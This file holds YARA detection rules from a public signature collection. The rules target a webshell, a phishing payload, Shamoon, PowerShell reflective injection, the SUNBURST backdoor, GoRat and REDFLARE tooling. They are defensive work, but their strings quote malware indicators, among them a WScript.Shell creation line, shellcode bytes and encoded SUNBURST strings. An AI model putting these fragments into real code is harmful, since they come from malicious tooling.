rule SIGNATURE_BASE_FSO_S_Ajan_2_2
{
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "a66c34ed-0ae2-5e04-bfc4-c82583c5e066"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L9030-L9042"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "0ac31ee735c94289932369dfba5b408cbf71cc23fd48ce3e09dc7ce640a0d733"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
		$s3 = "/file.zip"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_PHISH_Final_Payload_Feb25_2
{
	meta:
		description = "Detects possible final payload of phishing-delivered malware, where embedded shellcode is used to decrypt and execute the payload after user-supplied password input."
		author = "X__Junior"
		id = "9014e1f2-09c2-5ba0-8b7c-6ae8c069d1f7"
		date = "2025-02-14"
		modified = "2025-03-20"
		reference = "https://x.com/dtcert/status/1890384162818802135"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_phish_feb25.yar#L16-L35"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "de384aba6b0c6800095eb530954aa718d4ed96cccfc0b1e5e4d01404f3518a77"
		logic_hash = "3251d68a019d873987966d46c9e474e5a1ebbca4a33a8bf1e3c3ce119db8ab8c"
		score = 80
		quality = 85
		tags = ""

	strings:
		$s1 = "%lu: %s %s" wide
		$s2 = "(Direct Inbound)" wide
		$s3 = "(Primary Domain)" wide
		$s4 = "(Forest Tree Root" wide
		$s5 = "(Native Mode)" wide
		$s6 = "(In Forest)" wide
		$s7 = "(None)" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Crowdstrike_Shamoon_Droppedfile_2
{
	meta:
		description = "Rule to detect Shamoon malware http://goo.gl/QTxohN"
		author = "Florian Roth"
		id = "b350f1b1-db73-574b-957b-34e5a84f68b0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://www.rsaconference.com/writable/presentations/file_upload/exp-w01-hacking-exposed-day-of-destruction.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_shamoon.yar#L1-L13"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "ed550832b217f7edceea2edf7c4453925ed1759d97db7728f7face6ff10ee361"
		score = 75
		quality = 85
		tags = ""

	strings:
		$testn123 = "test123" wide
		$testn456 = "test456" wide
		$testn789 = "test789" wide
		$testdomain = "testdomain.com" wide
		$pingcmd = "ping -n 30 127.0.0.1 >nul" wide

	condition:
		( any of ( $testn* ) or $pingcmd ) and $testdomain
}

rule SIGNATURE_BASE_Power_Pe_Injection_2
{
	meta:
		description = "PowerShell with PE Reflective Injection"
		author = "Benjamin DELPY (gentilkiwi)"
		id = "a71fe9f2-9c2a-5650-a5c7-116b76f10db6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_mimikatz.yar#L91-L101"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "64a7033d51e8933912f37ce68bffc216073a88cae1ea7492e71a812411ae6a9d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str_loadlib = "0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9"

	condition:
		$str_loadlib
}

rule SIGNATURE_BASE_APT_Backdoor_SUNBURST_2_2
{
	meta:
		description = "The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking for each branch of the code that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunction. The grouping is intentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
		author = "FireEye"
		id = "329071d5-c9c6-5ae1-a514-aea9f4037bac"
		date = "2020-12-14"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_solarwinds_sunburst.yar#L28-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2bf0697b110bca88f712cbccaf0d2ba614d6093d6d9595659aefe088848d3826"
		score = 85
		quality = 83
		tags = ""

	strings:
		$a = "0y3Kzy8BAA==" wide
		$aa = "S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA" wide
		$ab = "S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=" wide
		$ac = "C88sSs1JLS4GAA==" wide
		$ad = "C/UEAA==" wide
		$ae = "C89MSU8tKQYA" wide
		$af = "8wvwBQA=" wide
		$ag = "cyzIz8nJBwA=" wide
		$ah = "c87JL03xzc/LLMkvysxLBwA=" wide
		$ai = "88tPSS0GAA==" wide
		$aj = "C8vPKc1NLQYA" wide
		$ak = "88wrSS1KS0xOLQYA" wide
		$al = "c87PLcjPS80rKQYA" wide
		$am = "Ky7PLNAvLUjRBwA=" wide
		$an = "06vIzQEA" wide
		$b = "0y3NyyxLLSpOzIlPTgQA" wide
		$c = "001OBAA=" wide
		$d = "0y0oysxNLKqMT04EAA==" wide
		$e = "0y3JzE0tLknMLQAA" wide
		$f = "003PyU9KzAEA" wide
		$h = "0y1OTS4tSk1OBAA=" wide
		$i = "K8jO1E8uytGvNqitNqytNqrVA/IA" wide
		$j = "c8rPSQEA" wide
		$k = "c8rPSfEsSczJTAYA" wide
		$l = "c60oKUp0ys9JAQA=" wide
		$m = "c60oKUp0ys9J8SxJzMlMBgA=" wide
		$n = "8yxJzMlMBgA=" wide
		$o = "88lMzygBAA==" wide
		$p = "88lMzyjxLEnMyUwGAA==" wide
		$q = "C0pNL81JLAIA" wide
		$r = "C07NzXTKz0kBAA==" wide
		$s = "C07NzXTKz0nxLEnMyUwGAA==" wide
		$t = "yy9IzStOzCsGAA==" wide
		$u = "y8svyQcA" wide
		$v = "SytKTU3LzysBAA==" wide
		$w = "C84vLUpOdc5PSQ0oygcA" wide
		$x = "C84vLUpODU4tykwLKMoHAA==" wide
		$y = "C84vLUpO9UjMC07MKwYA" wide
		$z = "C84vLUpO9UjMC04tykwDAA==" wide

	condition:
		($a and $b and $c and $d and $e and $f and $h and $i ) or ( $j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ( $aa or $ab ) ) or ( $t and $u and $v and $w and $x and $y and $z and ( $aa or $ab ) ) or ( $ac and $ad and $ae and $af and $ag and $ah and ( $am or $an ) ) or ( $ai and $aj and $ak and $al and ( $am or $an ) )
}

rule SIGNATURE_BASE_APT_Backdoor_Win_Gorat_Memory_1_2
{
	meta:
		description = "Identifies GoRat malware in memory based on strings."
		author = "FireEye"
		id = "4fcdd98f-1873-58e1-a9f5-73ee0aa5a69f"
		date = "2025-02-12"
		modified = "2025-02-12"
		reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_fireeye_redteam_tools.yar#L1013-L1039"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3b926b5762e13ceec7ac3a61e85c93bb"
		logic_hash = "bf8d80b7a7d35c1bcb353ff66d10bc95c2e6502043acc6554887465a467cdcf7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$rat1 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat2 = "rat.(*Core).generateBeacon" fullword
		$rat3 = "rat.gJitter" fullword
		$rat4 = "rat/comms.(*protectedChannel).SendCmdResponse" fullword
		$rat5 = "rat/modules/filemgmt.(*acquire).NewCommandExecution" fullword
		$rat6 = "rat/modules/latlisten.(*latlistensrv).handleCmd" fullword
		$rat7 = "rat/modules/netsweeper.(*netsweeperRunner).runSweep" fullword
		$rat8 = "rat/modules/netsweeper.(*Pinger).listen" fullword
		$rat9 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat10 = "rat/platforms/win/dyloader.(*memoryLoader).ExecutePluginFunction" fullword
		$rat11 = "rat/platforms/win/modules/namedpipe.(*dummy).Open" fullword
		$winblows = "rat/platforms/win.(*winblows).GetStage" fullword

	condition:
		$winblows or 3 of ( $rat* )
}

rule SIGNATURE_BASE_APT_Builder_PY_REDFLARE_2_1_2
{
	meta:
		description = "No description has been set in the source file - Signature Base"
		author = "FireEye"
		id = "74c56ee1-734e-5fdb-beee-6345a5993f68"
		date = "2020-12-01"
		modified = "2020-12-01"
		reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_fireeye_redteam_tools.yar#L1376-L1391"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4410e95de247d7f1ab649aa640ee86fb"
		logic_hash = "0f28fb23c0c1d589466c7c541c8dc588b038d02dded0c66c4a448d1f768c95c5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<510sxxII"
		$s2 = "0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,"
		$s3 = "parsePluginOutput"

	condition:
		all of them and #s2 == 2
}